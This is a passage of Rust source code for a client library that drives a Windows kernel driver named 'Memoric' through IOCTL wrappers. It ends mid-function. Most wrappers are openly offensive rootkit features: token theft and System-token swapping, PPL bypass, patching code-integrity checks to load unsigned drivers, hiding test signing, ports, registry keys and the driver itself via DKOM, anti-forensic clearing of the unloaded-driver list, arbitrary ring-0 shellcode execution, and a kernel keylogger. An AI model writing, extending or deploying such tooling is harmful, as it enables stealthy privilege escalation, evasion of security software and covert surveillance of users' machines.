    /// Add/remove/list/clear protected registry keys via CmRegisterCallbackEx.
    pub fn reg_protect(
        &self,
        action: u32,
        flags: u32,
        key_path: &str,
    ) -> Result<Vec<RegProtectEntry>, MemoricError> {
        let mut req = RegProtectRequest {
            action,
            flags,
            key_path: [0u16; 256],
        };

        let wide: Vec<u16> = key_path.encode_utf16().collect();
        let copy_len = wide.len().min(255);
        req.key_path[..copy_len].copy_from_slice(&wide[..copy_len]);

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<RegProtectRequest>(),
            )
        };

        if action == REG_PROTECT_LIST {
            // LIST returns an array of RegProtectEntry (max 32)
            let max_entries = 32;
            let out_size = max_entries * std::mem::size_of::<RegProtectEntry>();
            let output = self.ioctl(IOCTL_MEMORIC_REG_PROTECT, input, out_size)?;
            let entry_size = std::mem::size_of::<RegProtectEntry>();
            let count = output.len() / entry_size;
            let mut entries = Vec::with_capacity(count);
            for i in 0..count {
                let entry =
                    unsafe { *(output.as_ptr().add(i * entry_size) as *const RegProtectEntry) };
                entries.push(entry);
            }
            Ok(entries)
        } else {
            self.ioctl_no_output(IOCTL_MEMORIC_REG_PROTECT, input)?;
            Ok(Vec::new())
        }
    }

    // ================================================================
    // Notification Routine (Process/Thread/Image callbacks)
    // ================================================================

    /// Register a kernel notification callback (process/thread/image).
    pub fn notify_register(&self, notify_type: u32) -> Result<(), MemoricError> {
        let req = NotifyRequest {
            notify_type,
            action: NOTIFY_ACTION_REGISTER,
            max_events: 0,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<NotifyRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_NOTIFY_ROUTINE, input)
    }

    /// Unregister a kernel notification callback.
    pub fn notify_unregister(&self, notify_type: u32) -> Result<(), MemoricError> {
        let req = NotifyRequest {
            notify_type,
            action: NOTIFY_ACTION_UNREGISTER,
            max_events: 0,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<NotifyRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_NOTIFY_ROUTINE, input)
    }

    /// Query notification events from the kernel ring buffer.
    pub fn notify_query(&self, max_events: u32) -> Result<Vec<NotifyEvent>, MemoricError> {
        let max = if max_events == 0 {
            256
        } else {
            max_events.min(256)
        };
        let req = NotifyRequest {
            notify_type: 0,
            action: NOTIFY_ACTION_QUERY,
            max_events: max,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<NotifyRequest>(),
            )
        };
        let event_size = std::mem::size_of::<NotifyEvent>();
        let out_size = max as usize * event_size;
        let output = self.ioctl(IOCTL_MEMORIC_NOTIFY_ROUTINE, input, out_size)?;
        let count = output.len() / event_size;
        let mut events = Vec::with_capacity(count);
        for i in 0..count {
            let evt = unsafe { *(output.as_ptr().add(i * event_size) as *const NotifyEvent) };
            events.push(evt);
        }
        Ok(events)
    }

    // ================================================================
    // PE Dump (kernel-assisted process image dump)
    // ================================================================

    /// Dump a PE image from a target process using kernel MmCopyVirtualMemory.
    /// Returns (header info, raw PE bytes).
    pub fn pe_dump(
        &self,
        pid: u32,
        base_address: u64,
        max_size: u32,
    ) -> Result<(PeDumpResponse, Vec<u8>), MemoricError> {
        let req = PeDumpRequest {
            process_id: pid,
            reserved: 0,
            base_address,
            max_size: if max_size == 0 {
                MEMORIC_MAX_IO_SIZE as u32
            } else {
                max_size
            },
            reserved2: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PeDumpRequest>(),
            )
        };
        let resp_header_size = std::mem::size_of::<PeDumpResponse>();
        let out_size = MEMORIC_MAX_IO_SIZE; // header + PE bytes
        let output = self.ioctl(IOCTL_MEMORIC_PE_DUMP, input, out_size)?;

        if output.len() < resp_header_size {
            return Err(MemoricError::WindowsApi(
                "Incomplete PE dump response".to_string(),
            ));
        }

        let resp = unsafe { *(output.as_ptr() as *const PeDumpResponse) };
        let pe_bytes = output[resp_header_size..].to_vec();
        Ok((resp, pe_bytes))
    }

    // ================================================================
    // Anti-Debug (DebugPort manipulation)
    // ================================================================

    /// Manipulate the DebugPort of a target process to evade debuggers.
    pub fn set_debug_port(&self, pid: u32, action: u32) -> Result<(), MemoricError> {
        let req = DebugPortRequest {
            process_id: pid,
            action,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DebugPortRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_SET_DEBUG_PORT, input)
    }

    // ================================================================
    // DPC Timer (scheduled kernel-level delayed execution)
    // ================================================================

    /// Schedule a DPC timer for delayed kernel operation.
    pub fn dpc_schedule(
        &self,
        index: u32,
        delay_ms: u64,
        target_pid: u32,
        operation: u32,
    ) -> Result<(), MemoricError> {
        let req = DpcTimerRequest {
            action: DPC_SCHEDULE,
            timer_index: index,
            delay_ms,
            target_pid,
            operation,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DpcTimerRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_DPC_TIMER, input)
    }

    /// Cancel a running DPC timer.
    pub fn dpc_cancel(&self, index: u32) -> Result<(), MemoricError> {
        let req = DpcTimerRequest {
            action: DPC_CANCEL,
            timer_index: index,
            delay_ms: 0,
            target_pid: 0,
            operation: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DpcTimerRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_DPC_TIMER, input)
    }

    /// Query a DPC timer slot status.
    pub fn dpc_query(&self, index: u32) -> Result<DpcTimerResponse, MemoricError> {
        let req = DpcTimerRequest {
            action: DPC_QUERY,
            timer_index: index,
            delay_ms: 0,
            target_pid: 0,
            operation: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DpcTimerRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_DPC_TIMER,
            input,
            std::mem::size_of::<DpcTimerResponse>(),
        )?;
        if output.len() < std::mem::size_of::<DpcTimerResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete DPC timer response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const DpcTimerResponse) })
    }

    // ================================================================
    // Port Hide (track ports to hide from enumeration)
    // ================================================================

    /// Add/remove/list/clear hidden ports.
    pub fn port_hide(
        &self,
        action: u32,
        port: u16,
        protocol: u16,
    ) -> Result<Vec<PortHideEntry>, MemoricError> {
        let req = PortHideRequest {
            action,
            port,
            protocol,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PortHideRequest>(),
            )
        };

        if action == PORT_HIDE_LIST {
            let max_entries = 32usize;
            let out_size = max_entries * std::mem::size_of::<PortHideEntry>();
            let output = self.ioctl(IOCTL_MEMORIC_PORT_HIDE, input, out_size)?;
            let entry_size = std::mem::size_of::<PortHideEntry>();
            let count = output.len() / entry_size;
            let mut entries = Vec::with_capacity(count);
            for i in 0..count {
                entries.push(unsafe {
                    *(output.as_ptr().add(i * entry_size) as *const PortHideEntry)
                });
            }
            Ok(entries)
        } else {
            self.ioctl_no_output(IOCTL_MEMORIC_PORT_HIDE, input)?;
            Ok(Vec::new())
        }
    }

    // ================================================================
    // Token Duplicate (kernel-level token theft)
    // ================================================================

    /// Duplicate a token from source PID onto target PID.
    pub fn token_dup(
        &self,
        target_pid: u32,
        source_pid: u32,
        action: u32,
    ) -> Result<TokenDupResponse, MemoricError> {
        let req = TokenDupRequest {
            target_pid,
            source_pid,
            action,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<TokenDupRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_TOKEN_DUP,
            input,
            std::mem::size_of::<TokenDupResponse>(),
        )?;
        if output.len() < std::mem::size_of::<TokenDupResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete token dup response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const TokenDupResponse) })
    }

    // ================================================================
    // Object Hook (OB_OPERATION_REGISTRATION for process protection)
    // ================================================================

    /// Register object callback to protect a PID by stripping access from handle opens.
    pub fn object_hook_register(
        &self,
        protect_pid: u32,
        strip_access: u32,
    ) -> Result<(), MemoricError> {
        let req = ObjectHookRequest {
            action: OBJ_HOOK_REGISTER,
            object_type: OBJ_TYPE_PROCESS,
            protect_pid,
            strip_access,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ObjectHookRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_OBJECT_HOOK, input)
    }

    /// Unregister object callback.
    pub fn object_hook_unregister(&self) -> Result<(), MemoricError> {
        let req = ObjectHookRequest {
            action: OBJ_HOOK_UNREGISTER,
            object_type: 0,
            protect_pid: 0,
            strip_access: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ObjectHookRequest>(),
            )
        };
        self.ioctl_no_output(IOCTL_MEMORIC_OBJECT_HOOK, input)
    }

    /// Query object hook status.
    pub fn object_hook_query(&self) -> Result<ObjectHookResponse, MemoricError> {
        let req = ObjectHookRequest {
            action: OBJ_HOOK_QUERY,
            object_type: 0,
            protect_pid: 0,
            strip_access: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ObjectHookRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_OBJECT_HOOK,
            input,
            std::mem::size_of::<ObjectHookResponse>(),
        )?;
        if output.len() < std::mem::size_of::<ObjectHookResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete object hook response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const ObjectHookResponse) })
    }

    /// Query driver health statistics — IOCTL 0x8000206C
    pub fn driver_stats(&self) -> Result<DriverStatsResponse, MemoricError> {
        let output = self.ioctl(
            IOCTL_MEMORIC_DRIVER_STATS,
            &[],
            std::mem::size_of::<DriverStatsResponse>(),
        )?;
        if output.len() < std::mem::size_of::<DriverStatsResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete driver stats response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const DriverStatsResponse) })
    }

    /// Query kernel pool allocations by tag
    pub fn memory_pool_query(
        &self,
        pool_tag: u32,
        max_entries: u32,
    ) -> Result<(PoolQueryResponseHeader, Vec<PoolEntry>), MemoricError> {
        let req = PoolQueryRequest {
            pool_tag,
            max_entries,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PoolQueryRequest>(),
            )
        };
        let max_output =
            std::mem::size_of::<PoolQueryResponseHeader>() + 256 * std::mem::size_of::<PoolEntry>();
        let output = self.ioctl(IOCTL_MEMORIC_MEMORY_POOL, input, max_output)?;
        if output.len() < std::mem::size_of::<PoolQueryResponseHeader>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete pool query response".to_string(),
            ));
        }
        let header = unsafe { *(output.as_ptr() as *const PoolQueryResponseHeader) };
        let mut entries = Vec::new();
        let entry_offset = std::mem::size_of::<PoolQueryResponseHeader>();
        for i in 0..header.entry_count as usize {
            let off = entry_offset + i * std::mem::size_of::<PoolEntry>();
            if off + std::mem::size_of::<PoolEntry>() > output.len() {
                break;
            }
            entries.push(unsafe { *(output.as_ptr().add(off) as *const PoolEntry) });
        }
        Ok((header, entries))
    }

    /// Enumerate minifilter drivers from kernel
    pub fn minifilter_enum(&self) -> Result<Vec<MinifilterEntry>, MemoricError> {
        let max_output = std::mem::size_of::<MinifilterResponseHeader>()
            + 256 * std::mem::size_of::<MinifilterEntry>();
        let output = self.ioctl(IOCTL_MEMORIC_MINIFILTER_ENUM, &[], max_output)?;
        if output.len() < std::mem::size_of::<MinifilterResponseHeader>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete minifilter response".to_string(),
            ));
        }
        let header = unsafe { *(output.as_ptr() as *const MinifilterResponseHeader) };
        let mut entries = Vec::new();
        let entry_offset = std::mem::size_of::<MinifilterResponseHeader>();
        for i in 0..header.filter_count as usize {
            let off = entry_offset + i * std::mem::size_of::<MinifilterEntry>();
            if off + std::mem::size_of::<MinifilterEntry>() > output.len() {
                break;
            }
            entries.push(unsafe { *(output.as_ptr().add(off) as *const MinifilterEntry) });
        }
        Ok(entries)
    }

    /// Dump process memory regions
    pub fn process_dump(
        &self,
        pid: u32,
        flags: u32,
        base_address: u64,
        max_size: u64,
    ) -> Result<(ProcessDumpResponseHeader, Vec<RegionEntry>), MemoricError> {
        let req = ProcessDumpRequest {
            process_id: pid,
            flags,
            base_address,
            max_size,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ProcessDumpRequest>(),
            )
        };
        let max_output = std::mem::size_of::<ProcessDumpResponseHeader>()
            + 4096 * std::mem::size_of::<RegionEntry>();
        let output = self.ioctl(IOCTL_MEMORIC_PROCESS_DUMP, input, max_output)?;
        if output.len() < std::mem::size_of::<ProcessDumpResponseHeader>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete process dump response".to_string(),
            ));
        }
        let header = unsafe { *(output.as_ptr() as *const ProcessDumpResponseHeader) };
        let mut entries = Vec::new();
        let entry_offset = std::mem::size_of::<ProcessDumpResponseHeader>();
        for i in 0..header.region_count as usize {
            let off = entry_offset + i * std::mem::size_of::<RegionEntry>();
            if off + std::mem::size_of::<RegionEntry>() > output.len() {
                break;
            }
            entries.push(unsafe { *(output.as_ptr().add(off) as *const RegionEntry) });
        }
        Ok((header, entries))
    }

    /// Kernel-level hypervisor detection
    pub fn hypervisor_detect(&self) -> Result<HypervisorDetectResponse, MemoricError> {
        let output = self.ioctl(
            IOCTL_MEMORIC_HYPERVISOR_DETECT,
            &[],
            std::mem::size_of::<HypervisorDetectResponse>(),
        )?;
        if output.len() < std::mem::size_of::<HypervisorDetectResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete hypervisor detect response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const HypervisorDetectResponse) })
    }

    /// Kernel-level test signing concealment
    pub fn testsign_hide(&self, action: u32) -> Result<TestSignResponse, MemoricError> {
        let req = TestSignRequest {
            action,
            reserved: [0; 3],
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<TestSignRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_TESTSIGN_HIDE,
            input,
            std::mem::size_of::<TestSignResponse>(),
        )?;
        if output.len() < std::mem::size_of::<TestSignResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete testsign response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const TestSignResponse) })
    }

    /// Query a kernel module's base address from kernel-mode.
    /// Works on Windows 26220+ where user-mode queries return zeroed addresses.
    pub fn get_module_base(&self, name: &str) -> Result<ModuleBaseResponse, MemoricError> {
        let mut req = ModuleBaseRequest {
            module_name: [0u8; 256],
        };
        let name_bytes = name.as_bytes();
        let copy_len = name_bytes.len().min(255);
        req.module_name[..copy_len].copy_from_slice(&name_bytes[..copy_len]);

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ModuleBaseRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_GET_MODULE_BASE,
            input,
            std::mem::size_of::<ModuleBaseResponse>(),
        )?;
        if output.len() < std::mem::size_of::<ModuleBaseResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete module base response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const ModuleBaseResponse) })
    }

    /// Patch SeCiCallbacks in ntoskrnl — replace CiValidateImageHeader pointer
    /// with ZwFlushInstructionCache (always returns SUCCESS).
    pub fn ci_callback_patch(&self, action: u32) -> Result<CiCallbackResponse, MemoricError> {
        let req = CiCallbackRequest {
            action,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CiCallbackRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_CI_CALLBACK_PATCH,
            input,
            std::mem::size_of::<CiCallbackResponse>(),
        )?;
        if output.len() < std::mem::size_of::<CiCallbackResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete CI callback response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const CiCallbackResponse) })
    }

    /// Patch CiValidateImageHeader prologue to "xor eax,eax; ret"
    /// using PTE manipulation (Hyper-V safe, no CR0.WP).
    pub fn ci_func_patch(&self, action: u32) -> Result<CiFuncPatchResponse, MemoricError> {
        let req = CiFuncPatchRequest {
            action,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CiFuncPatchRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_CI_FUNC_PATCH,
            input,
            std::mem::size_of::<CiFuncPatchResponse>(),
        )?;
        if output.len() < std::mem::size_of::<CiFuncPatchResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete CI func patch response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const CiFuncPatchResponse) })
    }

    /// Read or modify page table entries for a given virtual address.
    pub fn pte_rw(&self, action: u32, va: u64, new_pte: u64) -> Result<PteResponse, MemoricError> {
        let req = PteRequest {
            action,
            reserved: 0,
            virtual_address: va,
            new_pte_value: new_pte,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PteRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_PTE_RW,
            input,
            std::mem::size_of::<PteResponse>(),
        )?;
        if output.len() < std::mem::size_of::<PteResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete PTE response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const PteResponse) })
    }

    /// Read or write a Model Specific Register.
    pub fn msr_rw(
        &self,
        action: u32,
        msr_index: u32,
        value: u64,
    ) -> Result<MsrResponse, MemoricError> {
        let req = MsrRequest {
            action,
            msr_index,
            value,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<MsrRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_MSR_RW,
            input,
            std::mem::size_of::<MsrResponse>(),
        )?;
        if output.len() < std::mem::size_of::<MsrResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete MSR response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const MsrResponse) })
    }

    /// Cloak a driver by unlinking from PsLoadedModuleList (DKOM).
    pub fn driver_cloak(
        &self,
        action: u32,
        driver_name: Option<&str>,
    ) -> Result<DriverCloakResponse, MemoricError> {
        let mut req = DriverCloakRequest {
            action,
            reserved: 0,
            driver_name: [0u16; 64],
        };
        if let Some(name) = driver_name {
            let wide: Vec<u16> = name.encode_utf16().collect();
            let len = wide.len().min(63);
            req.driver_name[..len].copy_from_slice(&wide[..len]);
        }
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DriverCloakRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_DRIVER_CLOAK,
            input,
            std::mem::size_of::<DriverCloakResponse>(),
        )?;
        if output.len() < std::mem::size_of::<DriverCloakResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete driver cloak response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const DriverCloakResponse) })
    }

    /// Force-kill any process from kernel mode.
    pub fn force_kill(
        &self,
        action: u32,
        pid: u32,
        exit_code: u32,
    ) -> Result<ForceKillResponse, MemoricError> {
        let req = ForceKillRequest {
            action,
            process_id: pid,
            exit_code,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ForceKillRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_FORCE_KILL,
            input,
            std::mem::size_of::<ForceKillResponse>(),
        )?;
        if output.len() < std::mem::size_of::<ForceKillResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete force kill response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const ForceKillResponse) })
    }

    /// Force-delete a locked or protected file from kernel mode.
    /// `path` must be NT path format (e.g., `\??\C:\path\to\file`).
    pub fn force_delete(&self, path: &str) -> Result<ForceDeleteResponse, MemoricError> {
        let mut req = ForceDeleteRequest {
            file_path: [0u16; 260],
        };
        let wide: Vec<u16> = path.encode_utf16().collect();
        let len = wide.len().min(259);
        req.file_path[..len].copy_from_slice(&wide[..len]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ForceDeleteRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_FORCE_DELETE,
            input,
            std::mem::size_of::<ForceDeleteResponse>(),
        )?;
        if output.len() < std::mem::size_of::<ForceDeleteResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete force delete response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const ForceDeleteResponse) })
    }

    /// Create a kernel-mode system thread.
    pub fn system_thread(
        &self,
        action: u32,
        start_address: u64,
        context: u64,
    ) -> Result<SystemThreadResponse, MemoricError> {
        let req = SystemThreadRequest {
            action,
            reserved: 0,
            start_address,
            context,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<SystemThreadRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_SYSTEM_THREAD,
            input,
            std::mem::size_of::<SystemThreadResponse>(),
        )?;
        if output.len() < std::mem::size_of::<SystemThreadResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete system thread response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const SystemThreadResponse) })
    }

    /// Execute arbitrary shellcode in kernel mode (ring-0).
    pub fn kernel_exec(
        &self,
        action: u32,
        shellcode: &[u8],
        allocated_address: u64,
    ) -> Result<KernelExecResponse, MemoricError> {
        let header = KernelExecRequest {
            action,
            shellcode_size: shellcode.len() as u32,
            allocated_address,
        };
        // Build combined buffer: header + shellcode
        let header_bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const _ as *const u8,
                std::mem::size_of::<KernelExecRequest>(),
            )
        };
        let mut input = Vec::with_capacity(header_bytes.len() + shellcode.len());
        input.extend_from_slice(header_bytes);
        input.extend_from_slice(shellcode);
        let output = self.ioctl(
            IOCTL_MEMORIC_KERNEL_EXEC,
            &input,
            std::mem::size_of::<KernelExecResponse>(),
        )?;
        if output.len() < std::mem::size_of::<KernelExecResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete kernel exec response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const KernelExecResponse) })
    }

    /// PPL Bypass — strip/set/query PS_PROTECTION on EPROCESS.
    pub fn ppl_bypass(
        &self,
        action: u32,
        pid: u32,
        protection_level: u8,
    ) -> Result<PplBypassResponse, MemoricError> {
        let req = PplBypassRequest {
            action,
            process_id: pid,
            protection_level,
            reserved: [0; 7],
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PplBypassRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_PPL_BYPASS,
            input,
            std::mem::size_of::<PplBypassResponse>(),
        )?;
        if output.len() < std::mem::size_of::<PplBypassResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete PPL bypass response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const PplBypassResponse) })
    }

    /// Read or write control registers (CR0, CR3, CR4).
    pub fn cr_rw(
        &self,
        action: u32,
        cr_index: u32,
        value: u64,
    ) -> Result<CrResponse, MemoricError> {
        let req = CrRequest {
            action,
            cr_index,
            value,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CrRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_CR_RW,
            input,
            std::mem::size_of::<CrResponse>(),
        )?;
        if output.len() < std::mem::size_of::<CrResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete CR response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const CrResponse) })
    }

    /// Read or modify Interrupt Descriptor Table entries.
    pub fn idt_rw(
        &self,
        action: u32,
        vector: u32,
        new_handler: u64,
        new_dpl: u16,
    ) -> Result<IdtResponse, MemoricError> {
        let req = IdtRequest {
            action,
            vector,
            new_handler,
            new_dpl,
            reserved: [0; 3],
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<IdtRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_IDT_RW,
            input,
            std::mem::size_of::<IdtResponse>(),
        )?;
        if output.len() < std::mem::size_of::<IdtResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete IDT response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const IdtResponse) })
    }

    /// Clear unloaded drivers list (anti-forensics).
    pub fn unloaded_drv_clear(
        &self,
        action: u32,
        driver_name: Option<&str>,
    ) -> Result<UnloadedDrvResponse, MemoricError> {
        let mut req = UnloadedDrvRequest {
            action,
            reserved: 0,
            driver_name: [0u16; 64],
        };
        if let Some(name) = driver_name {
            let wide: Vec<u16> = name.encode_utf16().collect();
            let len = wide.len().min(63);
            req.driver_name[..len].copy_from_slice(&wide[..len]);
        }
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<UnloadedDrvRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_UNLOADED_DRV_CLEAR,
            input,
            std::mem::size_of::<UnloadedDrvResponse>(),
        )?;
        if output.len() < std::mem::size_of::<UnloadedDrvResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete unloaded drivers response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const UnloadedDrvResponse) })
    }

    /// Token swap — steal System token or swap tokens between processes.
    pub fn token_swap(
        &self,
        action: u32,
        target_pid: u32,
        source_pid: u32,
    ) -> Result<TokenSwapResponse, MemoricError> {
        let req = TokenSwapRequest {
            action,
            target_pid,
            source_pid,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<TokenSwapRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_TOKEN_SWAP,
            input,
            std::mem::size_of::<TokenSwapResponse>(),
        )?;
        if output.len() < std::mem::size_of::<TokenSwapResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete token swap response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const TokenSwapResponse) })
    }

    /// Set/strip/query PS_PROTECTION on a process (PPL management).
    pub fn process_protect(
        &self,
        action: u32,
        pid: u32,
        signer_type: u8,
        signer_audit: u8,
        signer_level: u8,
    ) -> Result<ProcessProtectResponse, MemoricError> {
        let req = ProcessProtectRequest {
            action,
            process_id: pid,
            signer_type,
            signer_audit,
            signer_level,
            reserved: [0; 5],
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ProcessProtectRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_PROCESS_PROTECT,
            input,
            std::mem::size_of::<ProcessProtectResponse>(),
        )?;
        if output.len() < std::mem::size_of::<ProcessProtectResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete process protect response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const ProcessProtectResponse) })
    }

    // === Phase 13 Wrappers ===

    /// Kernel keylogger — start/stop/read captured keystrokes via gafAsyncKeyState.
    pub fn keylogger(&self, action: u32, max_keys: u32) -> Result<KeyloggerResponse, MemoricError> {
        let req = KeyloggerRequest { action, max_keys };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<KeyloggerRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_KEYLOGGER,
            input,
            std::mem::size_of::<KeyloggerResponse>(),
        )?;
        if output.len() < std::mem::size_of::<KeyloggerResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete keylogger response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const KeyloggerResponse) })
    }

    /// Hide registry keys/values from user-mode enumeration.
    pub fn reg_hide(
        &self,
        action: u32,
        hide_type: u32,
        key_path: &str,
        value_name: Option<&str>,
    ) -> Result<RegHideResponse, MemoricError> {
        let mut req = RegHideRequest {
            action,
            hide_type,
            key_path: [0u16; 256],
            value_name: [0u16; 128],
        };
        let wide_path: Vec<u16> = key_path.encode_utf16().collect();
        let len = wide_path.len().min(255);
        req.key_path[..len].copy_from_slice(&wide_path[..len]);
        if let Some(vn) = value_name {
            let wide_val: Vec<u16> = vn.encode_utf16().collect();
